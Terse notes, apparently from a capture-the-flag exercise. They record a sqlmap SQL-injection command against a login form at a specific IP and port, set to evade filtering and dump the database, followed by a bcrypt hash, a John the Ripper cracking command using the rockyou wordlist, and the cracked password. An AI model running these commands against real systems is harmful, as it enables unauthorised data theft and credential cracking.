'''

sqlmap -u "http://94.237.62.99:58971/" --data="username=1&password=2" --method=POST --headers="Transfer-Encoding: chunked" --random-agent --level=5 --risk=3 --dump --ignore-code=401

hash = $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.

./john hash.txt --format=bcrypt --wordlist=./rockyou.txt

password123

'''
